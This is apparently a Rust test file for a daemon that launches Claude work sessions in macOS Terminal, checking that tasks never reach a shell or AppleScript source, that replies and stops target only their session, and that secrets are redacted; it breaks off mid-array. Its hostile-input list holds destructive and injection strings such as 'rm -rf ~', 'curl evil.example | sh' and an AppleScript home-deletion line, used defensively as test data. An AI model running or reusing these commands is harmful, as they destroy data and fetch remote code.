//! Port of bridge/tests/test_work_sessions.py (and the work-session part of test_eve_mcp.py).
//!
//! Nothing here opens a terminal or runs claude: osascript, ps and kill are fakes that record what they were given.
//! What is proved: a task, however hostile, never reaches a shell line or an AppleScript source, only the argv of
//! claude; the session runs in exactly the work folder; a reply reaches only that session's tab and is refused when
//! it is not live; stop signals only that session's process.

use super::*;
use std::os::unix::fs::PermissionsExt;
use tempfile::TempDir;

const HOSTILE: [&str; 7] = [
    "fix the build\"; rm -rf ~; echo \"",
    "'$(touch /tmp/eve-pwned)' `id` && curl evil.example | sh",
    "\" & (do shell script \"say hacked\") & \"",
    "end tell\ntell application \"Finder\" to delete every item of home\n",
    "-p --print reply with ready",
    "--dangerously-skip-permissions --mcp-config /tmp/x.json",
    "a\\\" ; echo \\\\ ; $HOME ${IFS} %s %n",
];
const PYTHON: &str = "/opt/eve/bridge/.venv/bin/python";
const SID: &str = "0f0e0d0c-0b0a-4908-8706-050403020100";
const OTHER: &str = "11111111-2222-4333-8444-555555555555";
const NOBODY: &str = "99999999-2222-4333-8444-555555555555";

struct MacState {
    scripts: Vec<(String, Vec<String>)>,
    /// pid -> args, as ps prints them
    procs: IndexMap<i64, String>,
    killed: Vec<(i64, i32)>,
    open_answer: (i32, String),
    type_answer: (i32, String),
    dies_on_term: bool,
    ps_fails: bool,
}

/// osascript, ps and kill as the Mac would answer them, recording every call.
#[derive(Clone)]
struct Mac(Arc<parking_lot::Mutex<MacState>>);

impl Mac {
    fn new() -> Self {
        Mac(Arc::new(parking_lot::Mutex::new(MacState {
            scripts: Vec::new(),
            procs: IndexMap::new(),
            killed: Vec::new(),
            open_answer: (0, "4321 /dev/ttys009".to_string()),
            type_answer: (0, "ok".to_string()),
            dies_on_term: true,
            ps_fails: false,
        })))
    }

    fn st(&self) -> parking_lot::MutexGuard<'_, MacState> {
        self.0.lock()
    }

    fn osascript(&self) -> Osascript {
        let mac = self.clone();
        Arc::new(move |script: String, args: Vec<String>| {
            let mac = mac.clone();
            Box::pin(async move {
                let mut st = mac.st();
                st.scripts.push((script.clone(), args));
                if script == TERMINAL_OPEN {
                    return Ok(st.open_answer.clone());
                }
                if script == TERMINAL_TYPE {
                    return Ok(st.type_answer.clone());
                }
                panic!("an unexpected script");
            })
        })
    }

    fn ps(&self, argv: &[String], timeout: Duration) -> Result<RunOutput, RunError> {
        assert_eq!(argv[0], PS, "an unexpected command {}", argv[0]);
        let st = self.st();
        if st.ps_fails {
            return Err(RunError::Timeout { argv: argv.to_vec(), timeout });
        }
        let out: Vec<String> = st.procs.iter().map(|(pid, args)| format!("{pid} {args}")).collect();
        Ok(RunOutput { returncode: 0, stdout: out.join("\n") })
    }

    fn run(&self) -> RunFn {
        let mac = self.clone();
        Arc::new(move |argv: &[String], timeout: Duration| mac.ps(argv, timeout))
    }

    fn kill(&self) -> KillFn {
        let mac = self.clone();
        Arc::new(move |pid, sig| {
            let mut st = mac.st();
            st.killed.push((pid, sig));
            if sig == libc::SIGKILL || st.dies_on_term {
                st.procs.shift_remove(&pid);
            }
            Ok(())
        })
    }

    fn claude(&self, pid: i64, sid: &str, task: &str) {
        let argv = launch_argv(sid, task, Path::new("/x/m.json"), "/usr/local/bin/claude").unwrap();
        self.st().procs.insert(pid, argv.join(" "));
    }

    fn scripts(&self) -> Vec<(String, Vec<String>)> {
        self.st().scripts.clone()
    }
}

/// A clock the test moves.
#[derive(Clone)]
struct Clock(Arc<parking_lot::Mutex<f64>>);

impl Clock {
    fn at(t: f64) -> Self {
        Clock(Arc::new(parking_lot::Mutex::new(t)))
    }
    fn advance(&self, secs: f64) {
        *self.0.lock() += secs;
    }
    fn func(&self) -> ClockFn {
        let c = self.clone();
        Arc::new(move || *c.0.lock())
    }
}

type Shared = Arc<parking_lot::Mutex<State>>;

fn make(tmp: &Path, mac: &Mac, state: Option<Shared>, clock: Option<&Clock>) -> WorkSessions {
    let opts = Options {
        root: Some(tmp.join("personal").join("work")),
        home: Some(tmp.join("home")),
        state: Arc::new(move || state.clone()),
        osascript: mac.osascript(),
        run: mac.run(),
        kill: mac.kill(),
        live: Some(Arc::new(|| None)),
        clock: clock.map(Clock::func).unwrap_or_else(|| Arc::new(eve_state::wall_time)),
        launch: Launch::Python { python: PYTHON.to_string() },
        sleep: Arc::new(|_| Box::pin(tokio::task::yield_now())),
        environ: Some(Environ::new()),
        claude_dir: Some(tmp.join("claude")),
    };
    WorkSessions::new(opts)
}

fn never() -> Osascript {
    Arc::new(|_, _| Box::pin(async { panic!("no terminal") }))
}

async fn start(work: &WorkSessions, task: &str, client_id: &str) -> Answer {
    work.start(&json!(task), &json!(client_id)).await
}

async fn start_sid(work: &WorkSessions, task: &str) -> String {
    let (status, out) = start(work, task, "").await;
    assert_eq!(status, 200, "{out}");
    out["session"]["id"].as_str().unwrap().to_string()
}

fn mode(p: &Path) -> u32 {
    std::fs::metadata(p).unwrap().permissions().mode() & 0o777
}

fn ids(out: &Value) -> Vec<String> {
    out["sessions"].as_array().unwrap().iter().map(|r| r["id"].as_str().unwrap().to_string()).collect()
}

fn reason(r: &str) -> Value {
    json!({"ok": false, "reason": r})
}

// ---- start: the task never reaches a shell or a script ---------------------------------------------------------

#[tokio::test]
async fn test_a_task_is_never_in_a_shell_line_or_a_script_only_claudes_argv() {
    for task in HOSTILE {
        let tmp = TempDir::new().unwrap();
        let tmp = tmp.path();
        let mac = Mac::new();
        let work = make(tmp, &mac, None, None);
        let (status, out) = start(&work, task, "").await;
        assert!(status == 200 && out["ok"] == json!(true));
        let sid = out["session"]["id"].as_str().unwrap().to_string();
        assert!(is_uuid(&sid) && !sid.ends_with('\n'));
        let scripts = mac.scripts();
        assert_eq!(scripts.len(), 1);
        let (script, args) = &scripts[0];
        assert_eq!(script, TERMINAL_OPEN); // a fixed source, the line is its argument
        assert_eq!(args.len(), 1);
        let line = &args[0];
        let root = tmp.join("personal").join("work");
        assert_eq!(
            line,
            &format!(
                "cd {} && exec {} -P -m eve_bridge.work_sessions launch {sid}",
                py::shlex_quote(&root.to_string_lossy()),
                py::shlex_quote(PYTHON)
            )
        );
        for word in py::split(task) {
            if py::len(word) > 3 {
                assert!(!line.contains(word), "{word}");
            }
        }
        // the task waits in a 0600 file, and only main() reads it, into one argv element after "--"
        let task_file = tmp.join("home").join("work").join(format!("{sid}.task"));
        assert_eq!(std::fs::read_to_string(&task_file).unwrap(), py::strip(task));
        assert_eq!(mode(&task_file), 0o600);
        assert_eq!(mode(task_file.parent().unwrap()), 0o700);
        let mut ran: Vec<(String, Vec<String>)> = Vec::new();
        let which = |name: &str| (name == "claude").then(|| PathBuf::from("/usr/local/bin/claude"));
        let code = main_with(&["launch".to_string(), sid.clone()], Some(&tmp.join("home")), &which, &mut |f, a| {
            ran.push((f.to_string(), a.to_vec()));
            Ok(())
        });
        assert_eq!(code, 0);
        let mcp = tmp.join("home").join("work").join(format!("{sid}.mcp.json"));
        let want: Vec<String> = [
            "/usr/local/bin/claude",
            "--dangerously-skip-permissions",
            "--mcp-config",
            &mcp.to_string_lossy(),
            "--session-id",
            &sid,
            "--",
            py::strip(task),
        ]
        .iter()
        .map(|s| s.to_string())
        .collect();
        assert_eq!(ran, vec![("/usr/local/bin/claude".to_string(), want)]);
        assert!(!task_file.exists()); // read once, then gone
    }
}

#[tokio::test]
async fn test_the_session_runs_in_personal_work_never_the_work_area() {
    let tmp = TempDir::new().unwrap();
    let tmp = tmp.path();
    let home = home_dir();
    let empty = Environ::new();
    assert_eq!(work_root(Some(&empty)), home.join("Documents").join("personal").join("work"));
    // claude_launch.code_root({}) is ~/Documents, so its "work" area is ~/Documents/work.
    assert_ne!(work_root(Some(&empty)), home.join("Documents").join("work"));
    let env: Environ = [("EVE_WORK_ROOT".to_string(), tmp.to_string_lossy().into_owned())].into();
    assert_eq!(work_root(Some(&env)), tmp);
    let mac = Mac::new();
    let work = make(tmp, &mac, None, None);
    start(&work, "hello", "").await;
    let line = mac.scripts()[0].1[0].clone();
    let root = tmp.join("personal").join("work");
    assert!(line.starts_with(&format!("cd {} && ", py::shlex_quote(&root.to_string_lossy()))));
    assert!(!line.contains("era-code") && !line.split("&&").next().unwrap().contains("claude"));
    assert!(root.is_dir());
}

#[tokio::test]
async fn test_eves_mcp_config_is_private_and_holds_only_a_token_hash_in_the_registry() {
    let tmp = TempDir::new().unwrap();
    let tmp = tmp.path();
    let mac = Mac::new();
    let work = make(tmp, &mac, None, None);
    let sid = start_sid(&work, "hello").await;
    let mcp = tmp.join("home").join("work").join(format!("{sid}.mcp.json"));
    assert_eq!(mode(&mcp), 0o600);
    let config: Value = serde_json::from_str(&std::fs::read_to_string(&mcp).unwrap()).unwrap();
    let server = &config["mcpServers"]["eve"];
    assert!(server["command"] == json!(PYTHON) && server["args"] == json!(["-P", "-m", "eve_bridge.eve_mcp"]));
    let token = server["env"]["EVE_MCP_TOKEN"].as_str().unwrap().to_string();
    assert!(server["env"]["EVE_MCP_SESSION"] == json!(sid) && token.len() >= 40);
    let registry_path = tmp.join("home").join(REGISTRY_NAME);
    let registry = std::fs::read_to_string(&registry_path).unwrap();
    assert!(!registry.contains(&token) && registry.contains(&sid));
    assert_eq!(mode(&registry_path), 0o600);
    assert!(work.check_token(Some(&sid), Some(&token)) && !work.check_token(Some(&sid), Some(&token[..token.len() - 1])));
    assert!(!work.check_token(Some("nope"), Some(&token)) && !work.check_token(Some(&sid), None));
    let again = WorkSessions::new(Options {
        root: Some(tmp.join("w")),
        home: Some(tmp.join("home")),
        osascript: never(),
        environ: Some(Environ::new()),
        ..Options::default()
    });
    assert!(again.check_token(Some(&sid), Some(&token))); // the registry survives a restart
}

#[tokio::test]
async fn test_the_same_client_id_is_one_session_and_one_terminal() {
    let tmp = TempDir::new().unwrap();
    let mac = Mac::new();
    let work = make(tmp.path(), &mac, None, None);
    let a = start(&work, "hello", "c-1").await.1["session"]["id"].clone();
    let b = start(&work, "hello again", "c-1").await.1["session"]["id"].clone();
    let c = start(&work, "hello", "c-2").await.1["session"]["id"].clone();
    assert!(a == b && b != c);
    assert_eq!(mac.scripts().len(), 2);
}

#[tokio::test]
async fn test_a_bad_start_is_a_400_and_opens_nothing() {
    let cases: [(Value, Value); 7] = [
        (json!(""), json!("")),
        (json!("   "), json!("")),
        (Value::Null, json!("")),
        (json!(42), json!("")),
        (json!("x".repeat(4001)), json!("")),
        (json!("ok"), json!("c".repeat(65))),
        (json!("ok"), json!(7)),
    ];
    for (task, client_id) in cases {
        let tmp = TempDir::new().unwrap();
        let mac = Mac::new();
        let work = make(tmp.path(), &mac, None, None);
        let (status, out) = work.start(&task, &client_id).await;
        assert!(status == 400 && out["ok"] == json!(false) && mac.scripts().is_empty(), "{task} {client_id}");
    }
}

#[tokio::test]
async fn test_terminal_failing_is_a_503_and_leaves_nothing_behind() {
    let tmp = TempDir::new().unwrap();
    let mac = Mac::new();
    let work = make(tmp.path(), &mac, None, None);
    mac.st().open_answer = (1, "Not authorized to send Apple events to Terminal.".to_string());
    let (status, out) = start(&work, "hello", "").await;
    assert!(status == 503 && out == reason("eve couldn't open Terminal on the Mac"));
    assert!(work.records().is_empty());
    assert_eq!(std::fs::read_dir(tmp.path().join("home").join("work")).unwrap().count(), 0);
}

#[tokio::test]
async fn test_a_window_whose_id_terminal_did_not_give_runs_but_takes_no_reply() {
    let tmp = TempDir::new().unwrap();
    let mac = Mac::new();
    let work = make(tmp.path(), &mac, None, None);
    mac.st().open_answer = (0, "0 ".to_string());
    let (status, out) = start(&work, "hello", "").await;
    assert!(status == 200 && out["session"]["can_reply"] == json!(false));
    let sid = out["session"]["id"].as_str().unwrap().to_string();
    mac.claude(8, &sid, "a task");
    let typed = mac.scripts().len();
    assert_eq!(work.reply(&sid, &json!("hi")).await, (409, reason(NO_WINDOW)));
    assert_eq!(mac.scripts().len(), typed); // nothing typed anywhere
}

#[tokio::test]
async fn test_session_end_is_not_the_end_while_the_process_runs() {
    let tmp = TempDir::new().unwrap();
    let clock = Clock::at(1000.0);
    let mac = Mac::new();
    let work = make(tmp.path(), &mac, None, Some(&clock));
    let sid = start_sid(&work, "hello").await;
    mac.claude(8, &sid, "a task");
    work.note("session_end", &json!({"session_id": sid})); // a /clear
    clock.advance(GRACE_SECS + 1.0);
    assert_eq!(ids(&work.list().await.1), vec![sid.clone()]);
    assert_eq!(work.reply(&sid, &json!("hi")).await.0, 200);
}

// ---- the list ----------------------------------------------------------------------------------------------

#[tokio::test]
async fn test_states_follow_the_hooks_and_the_list_has_every_live_session() {
    let tmp = TempDir::new().unwrap();
    let tmp = tmp.path();
    let state: Shared = Arc::new(parking_lot::Mutex::new(State::new()));
    let mac = Mac::new();
    let work = make(tmp, &mac, Some(state.clone()), None);
    let sid = start_sid(&work, "Port the parser to Rust\nand keep the tests").await;
    mac.claude(501, &sid, "a task");
    let rows = work.list().await.1["sessions"].clone();
    let got: Vec<(Value, Value, Value, Value)> = rows
        .as_array()
        .unwrap()
        .iter()
        .map(|r| (r["id"].clone(), r["state"].clone(), r["title"].clone(), r["folder"].clone()))
        .collect();
    assert_eq!(got, vec![(json!(sid), json!("starting"), json!("Port the parser to Rust"), json!("work"))]);
    let steps = [
        ("session_start", json!({}), "idle"),
        ("turn_begin", json!({}), "working"),
        ("notification", json!({"notification_type": "idle_prompt"}), "working"),
        ("pretooluse", json!({"tool_name": "AskUserQuestion"}), "waiting"),
        ("posttooluse", json!({}), "working"),
        ("notification", json!({"notification_type": "permission_prompt"}), "waiting"),
        ("turn_begin", json!({}), "working"),
        ("turn_end", json!({}), "idle"),
    ];
    for (evt, req, want) in steps {
        let mut req = req;
        req["session_id"] = json!(sid);
        work.note(evt, &req);
        assert_eq!(work.list().await.1["sessions"][0]["state"], json!(want), "{evt}");
    }
    // another session the hooks told the daemon about: listed, read-only
    {
        let mut st = state.lock();
        st.session_start(OTHER, None, Some(&tmp.join("eve").to_string_lossy()));
        st.turn_begin(OTHER);
    }
    let out = work.list().await.1;
    let rows = out["sessions"].as_array().unwrap();
    let other = rows.iter().find(|r| r["from_work"] == json!(false)).unwrap();
    assert!(other["folder"] == json!("eve") && other["state"] == json!("working"));
    assert!(other["can_reply"] == json!(false) && other["can_stop"] == json!(false));
    let mine = rows.iter().find(|r| r["from_work"] == json!(true)).unwrap();
    assert!(mine["can_reply"] == json!(true) && mine["can_stop"] == json!(true));
    let keys: Vec<&str> = mine.as_object().unwrap().keys().map(String::as_str).collect();
    assert_eq!(
        keys,
        ["id", "folder", "title", "state", "last_activity", "last_line", "from_work", "can_reply", "can_stop"]
    );
    assert!(rows.iter().all(|r| !r["folder"].as_str().unwrap().contains('/'))); // basenames only
    assert_eq!(out["folder"], json!("work"));
}

#[tokio::test]
async fn test_a_session_whose_process_is_gone_leaves_the_list() {
    let tmp = TempDir::new().unwrap();
    let clock = Clock::at(1000.0);
    let mac = Mac::new();
    let work = make(tmp.path(), &mac, None, Some(&clock));
    let sid = start_sid(&work, "hello").await;
    assert_eq!(ids(&work.list().await.1), vec![sid.clone()]); // within its grace
    clock.advance(GRACE_SECS + 1.0);
    assert!(ids(&work.list().await.1).is_empty());
    assert!(work.records()[&sid].over());
    mac.st().ps_fails = true; // a blind probe keeps what it cannot judge
    let sid2 = start_sid(&work, "again").await;
    clock.advance(GRACE_SECS + 1.0);
    assert_eq!(ids(&work.list().await.1), vec![sid2]);
}

// ---- detail ------------------------------------------------------------------------------------------------

fn transcript(path: &Path, rows: &[Value]) -> PathBuf {
    std::fs::create_dir_all(path.parent().unwrap()).unwrap();
    let body: Vec<String> = rows.iter().map(|r| py::dumps(r, None)).collect();
    std::fs::write(path, body.join("\n") + "\n").unwrap();
    path.to_path_buf()
}

fn line(kind: &str, content: Value, extra: Value) -> Value {
    let mut row = json!({"type": kind, "timestamp": "2026-10-12T10:00:00.000Z",
                         "message": {"role": if kind == "user" { "user" } else { "assistant" }, "content": content}});
    if let Value::Object(extra) = extra {
        for (k, v) in extra {
            row[k] = v;
        }
    }
    row
}

#[tokio::test]
async fn test_detail_is_the_latest_turns_only_words_clipped_and_without_secrets() {
    let tmp = TempDir::new().unwrap();
    let tmp = tmp.path();
    let state: Shared = Arc::new(parking_lot::Mutex::new(State::new()));
    let mac = Mac::new();
    let work = make(tmp, &mac, Some(state), None);
    let sid = start_sid(&work, "hello").await;
    mac.claude(77, &sid, "a task");
    let found = format!(
        "Found it. Key sk-or-v1-{} and API_TOKEN=hunter2 and ghp_{} {}",
        "a".repeat(40),
        "b".repeat(36),
        "y".repeat(3000)
    );
    let path = transcript(
        &tmp.join("t").join(format!("{sid}.jsonl")),
        &[
            line("user", json!("Find the flaky test"), json!({})),
            line("user", json!("<command-name>/clear</command-name>"), json!({})),
            line("user", json!("Caveat: meta"), json!({"isMeta": true})),
            line(
                "assistant",
                json!([{"type": "thinking", "thinking": "private thoughts"},
                       {"type": "text", "text": "Looking now."},
                       {"type": "tool_use", "id": "t1", "name": "Bash", "input": {"command": "cat .env"}}]),
                json!({}),
            ),
            line("user", json!([{"type": "tool_result", "tool_use_id": "t1", "content": "OPENROUTER_API_KEY=abc123"}]), json!({})),
            line("assistant", json!([{"type": "text", "text": "Subagent says hi"}]), json!({"isSidechain": true})),
            line("assistant", json!([{"type": "text", "text": found}]), json!({})),
        ],
    );
    work.note("session_start", &json!({"session_id": sid, "transcript_path": path.to_string_lossy()}));
    let (status, out) = work.detail(&sid).await;
    assert_eq!(status, 200);
    let turns = out["turns"].as_array().unwrap();
    let got: Vec<(String, String)> = turns
        .iter()
        .map(|t| (t["role"].as_str().unwrap().to_string(), py::prefix(t["text"].as_str().unwrap(), 20).to_string()))
        .collect();
    let want: Vec<(String, String)> = [("owner", "Find the flaky test"), ("claude", "Looking now."), ("claude", "Found it. Key [hidde")]
        .iter()
        .map(|(a, b)| (a.to_string(), b.to_string()))
        .collect();
    assert_eq!(got, want);
    let last = turns.last().unwrap()["text"].as_str().unwrap();
    assert!(py::len(last) <= TURN_CHARS && last.ends_with('…'));
    let dumped = out.to_string();
    for secret in ["sk-or-v1-", "hunter2", "ghp_", "abc123", "private thoughts", "cat .env", "Subagent"] {
        assert!(!dumped.contains(secret), "{secret}");
    }
    assert!(turns[0]["at"].as_i64().unwrap() > 0 && out["cut"] == json!(false));
    assert_eq!(turns[0]["at"], json!(1_791_799_200));
    assert!(out["session"]["id"] == json!(sid) && out["session"]["last_line"].as_str().unwrap().starts_with("Found it."));
    assert_eq!(work.detail(NOBODY).await.0, 404);
}

#[tokio::test]
async fn test_detail_ends_a_session_whose_claude_exited_and_says_ended() {
    // /exit or a crash while the sheet is open (the list is not polled then): detail itself notices after the
    // grace, ends the record and answers state "ended"; within the grace it is "starting".
    let tmp = TempDir::new().unwrap();
    let clock = Clock::at(1000.0);
    let mac = Mac::new();
    let work = make(tmp.path(), &mac, None, Some(&clock));
    let sid = start_sid(&work, "hello").await;
    let (status, out) = work.detail(&sid).await;
    assert!(status == 200 && out["session"]["state"] == json!("starting") && out["ended"] == json!(false));
    mac.claude(9, &sid, "a task");
    work.note("session_start", &json!({"session_id": sid}));
    clock.advance(GRACE_SECS + 1.0);
    let out = work.detail(&sid).await.1;
    assert!(out["session"]["state"] == json!("idle") && out["session"]["can_reply"] == json!(true));
    assert_eq!(out["ended"], json!(false));
    mac.st().procs.shift_remove(&9); // the owner typed /exit
    let out = work.detail(&sid).await.1;
    assert!(out["ended"] == json!(true) && out["session"]["state"] == json!("ended"));
    assert!(out["session"]["can_reply"] == json!(false) && out["session"]["can_stop"] == json!(false));
    assert!(work.records()[&sid].over());
    mac.st().ps_fails = true; // a blind probe never ends a session
    let sid2 = start_sid(&work, "again").await;
    clock.advance(GRACE_SECS + 1.0);
    let out = work.detail(&sid2).await.1;
    assert!(out["ended"] == json!(false) && !work.records()[&sid2].over());
    // a stopped session reads as ended too
    mac.st().ps_fails = false;
    assert_eq!(work.stop(&sid2).await.unwrap().0, 200);
    let out = work.detail(&sid2).await.1;
    assert!(out["ended"] == json!(true) && out["session"]["state"] == json!("ended"));
}

#[tokio::test]
async fn test_a_session_past_its_grace_without_a_process_is_never_starting() {
    let tmp = TempDir::new().unwrap();
    let clock = Clock::at(1000.0);
    let mac = Mac::new();
    let work = make(tmp.path(), &mac, None, Some(&clock));
    let sid = start_sid(&work, "hello").await;
    work.records().get_mut(&sid).unwrap().phase = "working".to_string();
    let rec = work.records()[&sid].clone();
    let none: IndexMap<String, i64> = IndexMap::new();
    assert_eq!(work.row(&rec, Some(&none), None, "")["state"], json!("starting"));
    clock.advance(GRACE_SECS + 1.0);
    assert_eq!(work.row(&rec, Some(&none), None, "")["state"], json!("working"));
    assert_eq!(work.row(&rec, Some(&none), None, "")["can_reply"], json!(false));
}

#[test]
fn test_the_mcp_server_never_has_the_work_folder_on_sys_path() {
    let got = mcp_config(OTHER, "tok", PYTHON, Some(&Environ::new()));
    assert_eq!(got["mcpServers"]["eve"]["args"], json!(["-P", "-m", "eve_bridge.eve_mcp"]));
}

#[test]
fn test_detail_keeps_the_last_twenty_turns_of_a_long_transcript() {
    let tmp = TempDir::new().unwrap();
    let rows: Vec<Value> = (0..60)
        .map(|i| {
            if i % 2 == 1 {
                line("user", json!(format!("turn {i}")), json!({}))
            } else {
                line("assistant", json!([{"type": "text", "text": format!("turn {i}")}]), json!({}))
            }
        })
        .collect();
    let path = transcript(&tmp.path().join("t.jsonl"), &rows);
    let (turns, cut) = transcript_turns(Some(&path));
    let texts: Vec<String> = turns.iter().map(|t| t.text.clone()).collect();
    let want: Vec<String> = (40..60).map(|i| format!("turn {i}")).collect();
    assert!(texts == want && cut);
    let (turns, cut) = transcript_turns_with(Some(&path), TURNS_SHOWN, 200, TURN_CHARS); // a tail that starts mid-line
    assert!(cut && turns.iter().all(|t| t.text.starts_with("turn ")));
}

#[test]
fn test_a_transcript_path_is_derived_when_no_hook_gave_one() {
    let tmp = TempDir::new().unwrap();
    let got =
        derived_transcript(Path::new("/home/someone/Documents/personal/work"), "abc", Some(&tmp.path().join(".claude")))
            .unwrap();
    assert_eq!(got, tmp.path().join(".claude").join("projects").join("-home-someone-Documents-personal-work").join("abc.jsonl"));
}

// ---- reply: only that session, only while it is live ---------------------------------------------------------

#[tokio::test]
async fn test_a_reply_types_into_that_sessions_tab_only_as_an_argument() {
    let tmp = TempDir::new().unwrap();
    let mac = Mac::new();
    let work = make(tmp.path(), &mac, None, None);
    let sid = start_sid(&work, "hello").await;
    mac.claude(42, &sid, "a task");
    let text = "yes, and then \"quote\" $(rm -rf ~) \n second line";
    assert_eq!(work.reply(&sid, &json!(text)).await, (200, json!({"ok": true})));
    let (script, args) = mac.scripts().last().unwrap().clone();
    assert_eq!(script, TERMINAL_TYPE);
    assert_eq!(args, vec!["4321", "/dev/ttys009", "yes, and then \"quote\" $(rm -rf ~) second line"]); // one line
    assert!(!script.contains("rm -rf") && !script.contains("quote"));
}

#[tokio::test]
async fn test_a_reply_is_refused_when_the_session_is_not_live_or_not_ours() {
    let tmp = TempDir::new().unwrap();
    let clock = Clock::at(1000.0);
    let state: Shared = Arc::new(parking_lot::Mutex::new(State::new()));
    let mac = Mac::new();
    let work = make(tmp.path(), &mac, Some(state.clone()), Some(&clock));
    let sid = start_sid(&work, "hello").await;
    assert_eq!(work.reply(&sid, &json!("hi")).await.0, 409); // still starting: claude is not up
    clock.advance(GRACE_SECS + 1.0);
    let ended = (409, json!({"ok": false, "reason": ENDED, "code": ENDED_CODE}));
    assert_eq!(work.reply(&sid, &json!("hi")).await, ended);
    assert_eq!(work.reply(&sid, &json!("hi")).await, ended);
    let sid2 = start_sid(&work, "again").await;
    mac.claude(43, &sid2, "a task");
    let typed = mac.scripts().len();
    mac.st().ps_fails = true; // cannot tell: never type
    assert_eq!(work.reply(&sid2, &json!("hi")).await, (409, reason(NO_WINDOW)));
    mac.st().ps_fails = false;
    mac.st().type_answer = (0, "idle".to_string()); // a shell holds the tab: never type into it
    assert_eq!(work.reply(&sid2, &json!("hi")).await, (409, reason(NO_WINDOW)));
    mac.st().type_answer = (0, "gone".to_string());
    assert_eq!(work.reply(&sid2, &json!("hi")).await.0, 409);
    assert_eq!(mac.scripts().len(), typed + 2); // only the two the probe allowed were tried
    state.lock().session_start(OTHER, None, Some(&tmp.path().join("eve").to_string_lossy()));
    assert_eq!(work.reply(OTHER, &json!("hi")).await, (409, reason(NOT_OURS)));
    assert_eq!(work.reply(NOBODY, &json!("hi")).await.0, 404);
    mac.st().type_answer = (0, "ok".to_string());
    assert_eq!(work.reply(&sid2, &json!("  ")).await.0, 400);
    assert_eq!(work.reply(&sid2, &json!("x".repeat(4001))).await.0, 400);
    assert_eq!(work.reply(&sid2, &json!("fine")).await.0, 200); // positive control
}

// ---- stop --------------------------------------------------------------------------------------------------

#[tokio::test]
async fn test_stop_signals_only_that_sessions_process_and_is_idempotent() {
    let tmp = TempDir::new().unwrap();
    let state: Shared = Arc::new(parking_lot::Mutex::new(State::new()));
    let mac = Mac::new();
    let work = make(tmp.path(), &mac, Some(state.clone()), None);
    let a = start_sid(&work, "one").await;
    let b = start_sid(&work, "two").await;
    mac.claude(100, &a, "a task");
    mac.claude(200, &b, "a task");
    mac.st().procs.insert(300, "/usr/local/bin/claude --dangerously-skip-permissions".to_string()); // the owner's own
    state.lock().session_start(&a, None, Some(&work.root().to_string_lossy()));
    assert_eq!(work.stop(&a).await.unwrap(), (200, json!({"ok": true, "stopped": true})));
    assert_eq!(mac.st().killed, vec![(100, libc::SIGTERM)]);
    assert!(work.records()[&a].stopped && !state.lock().sessions.contains_key(&a));
    assert!(!tmp.path().join("home").join("work").join(format!("{a}.mcp.json")).exists());
    assert!(!work.check_token(Some(&a), Some("anything")));
    assert_eq!(work.stop(&a).await.unwrap(), (200, json!({"ok": true, "stopped": true}))); // again: still fine
    assert_eq!(mac.st().killed, vec![(100, libc::SIGTERM)]);
    assert!(mac.st().procs.contains_key(&200) && mac.st().procs.contains_key(&300));
    assert_eq!(work.reply(&a, &json!("hi")).await.0, 409);
}

#[tokio::test]
async fn test_a_session_that_ignores_sigterm_gets_sigkill() {
    let tmp = TempDir::new().unwrap();
    let mac = Mac::new();
    let work = make(tmp.path(), &mac, None, None);
    let sid = start_sid(&work, "one").await;
    mac.claude(100, &sid, "a task");
    mac.st().dies_on_term = false;
    assert_eq!(work.stop(&sid).await.unwrap().0, 200);
    assert_eq!(mac.st().killed, vec![(100, libc::SIGTERM), (100, libc::SIGKILL)]);
}

#[test]
fn test_ps_finds_session_ids_only_before_the_task() {
    let mac = Mac::new();
    mac.claude(5, SID, &format!("--session-id {OTHER}")); // a task that names another id
    mac.st().procs.insert(6, format!("node /opt/homebrew/bin/claude --session-id={OTHER}"));
    mac.st().procs.insert(7, format!("vim --session-id {SID}")); // not claude
    let run = |argv: &[String], timeout: Duration| mac.ps(argv, timeout);
    let got = session_pids(&run).unwrap();
    let want: IndexMap<String, i64> = [(SID.to_string(), 5), (OTHER.to_string(), 6)].into_iter().collect();
    assert_eq!(got, want);
}

#[test]
fn test_secrets_are_masked() {
    let text = format!(
        "token sk-proj-{} GITHUB_TOKEN='abc' password: hunter2 Bearer {} key AKIAABCDEFGHIJKLMNOP and {}",
        "x".repeat(30),
        "q".repeat(30),
        "a1".repeat(25)
    );
    let out = redact(&text);
    for bad in ["sk-proj-".to_string(), "abc'".to_string(), "hunter2".to_string(), "q".repeat(30), "AKIAABCD".to_string(), "a1".repeat(25)] {
        assert!(!out.contains(&bad), "{bad}");
    }
    assert_eq!(
        redact("plain words, a path /tmp/x and the number 12345"),
        "plain words, a path /tmp/x and the number 12345"
    );
}

#[test]
fn test_the_switch() {
    let env = |v: &str| -> Environ { [("EVE_WORK_SESSIONS".to_string(), v.to_string())].into() };
    assert!(enabled(Some(&Environ::new())) && enabled(Some(&env("1"))));
    for off in ["0", "off", "false", "no"] {
        assert!(!enabled(Some(&env(off))));
    }
}

// ---- test_eve_mcp.py: the daemon answers only a live session's token -------------------------------------------

#[test]
fn test_the_daemon_answers_only_a_live_sessions_token() {
    let tmp = TempDir::new().unwrap();
    let work = WorkSessions::new(Options {
        root: Some(tmp.path().join("work")),
        home: Some(tmp.path().join("home")),
        osascript: never(),
        ..Options::default()
    });
    let token = "a-session-token";
    work.records().insert(SID.to_string(), Record::new(SID, eve_state::wall_time(), "t", hash_token(token)));
    for (sid, tok) in [(Some(SID), Some("wrong")), (Some(SID), Some("")), (Some(SID), None), (Some("not-a-session"), Some(token)), (None, Some(token))] {
        assert!(!work.check_token(sid, tok));
    }
    assert!(work.check_token(Some(SID), Some(token))); // positive control
}

// ---- parity with Python --------------------------------------------------------------------------------------

#[test]
fn redact_matches_python_on_the_edges() {
    // Expected values printed by Python's work_sessions.redact.
    let cases: [(String, &str); 16] = [
        ("x -----BEGIN RSA PRIVATE KEY-----\nabc\n".into(), "x [hidden]\n"),
        ("k -----BEGIN PRIVATE KEY-----abc-----END PRIVATE KEY----- tail".into(), "k [hidden] tail"),
        (format!("{}1- x", "a".repeat(43)), "[hidden]- x"),
        (format!("-{}-", "a1".repeat(25)), "-[hidden]-"),
        (format!("é{}", "a1".repeat(25)), "\u{e9}a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1a1"),
        (format!("{}1", "a".repeat(39)), "[hidden]"),
        (format!("{}\u{663}", "a".repeat(45)), "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u{663}"),
        ("Token: \"abc def\" and secret_key = x9".into(), "Token=[hidden] and secret_key=[hidden]"),
        ("password='q w'".into(), "password=[hidden]"),
        ("bearer abcdefghijklmnopqrstuvwxyz".into(), "[hidden]"),
        ("xoxb-1234567890-abc".into(), "[hidden]"),
